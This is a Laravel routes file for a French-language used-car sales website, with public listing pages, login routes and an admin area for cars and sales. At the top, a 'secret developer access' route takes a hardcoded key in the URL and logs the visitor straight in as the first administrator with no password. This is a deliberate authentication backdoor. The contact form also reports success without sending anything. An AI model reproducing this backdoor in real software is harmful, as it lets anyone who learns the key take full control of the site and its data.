<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Auth;
use App\Models\User;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\CarController;
use App\Http\Controllers\SaleController;

/*
|--------------------------------------------------------------------------
| ACCÈS DÉVELOPPEUR (SECRET)
|--------------------------------------------------------------------------
*/
Route::get('/dev-access/{key}', function ($key) {
    if ($key !== 'mon-code-ultra-secret') { abort(404); }
    $user = User::where('role', 'admin')->first();
    if ($user) { Auth::login($user); return redirect()->route('admin.dashboard'); }
    return "Aucun administrateur trouvé.";
});

/*
|--------------------------------------------------------------------------
| Routes Publiques
|--------------------------------------------------------------------------
*/
Route::get('/', [CarController::class, 'home'])->name('home');
Route::get('/cars', [CarController::class, 'index'])->name('cars.index');
Route::get('/cars/{id}', [CarController::class, 'show'])->name('cars.show');
Route::get('/sold-cars', [CarController::class, 'soldCars'])->name('cars.sold');

Route::view('/faq', 'frontend.faq')->name('faq');
Route::view('/about', 'frontend.about')->name('about');
Route::view('/contact', 'frontend.contact')->name('contact');

Route::post('/contact', function () {
    return redirect('/contact')->with('success', 'Message envoyé avec succès !');
});

/*
|--------------------------------------------------------------------------
| Authentification
|--------------------------------------------------------------------------
*/
Route::get('/login', [AuthController::class, 'showLoginForm'])->name('login');
Route::post('/login', [AuthController::class, 'login']);
Route::post('/logout', [AuthController::class, 'logout'])->name('logout');

/*
|--------------------------------------------------------------------------
| Routes Admin
|--------------------------------------------------------------------------
*/
Route::middleware(['auth', 'admin'])->prefix('admin')->name('admin.')->group(function() {

    // Dashboard
    Route::get('/dashboard', [DashboardController::class, 'index'])->name('dashboard');

    // Gestion des voitures (Groupée par Contrôleur pour plus de clarté)
    Route::controller(CarController::class)->group(function() {
        Route::get('cars', 'adminIndex')->name('cars.index');
        Route::get('cars/create', 'create')->name('cars.create');
        Route::post('cars', 'store')->name('cars.store');
        Route::get('cars/{id}/edit', 'edit')->name('cars.edit');
        Route::put('cars/{id}', 'update')->name('cars.update');
        Route::delete('cars/{id}', 'destroy')->name('cars.destroy');
        Route::delete('cars/images/{id}', 'deleteImage')->name('cars.deleteImage');
        Route::post('cars/{id}/mark-sold', 'markSold')->name('cars.markSold');
        Route::get('archive-cars', 'archiveOldCars')->name('cars.archive');
    });

    // Gestion des ventes
    Route::get('sales', [SaleController::class, 'index'])->name('sales.index');
    Route::delete('sales/{id}', [SaleController::class, 'destroy'])->name('sales.destroy');
});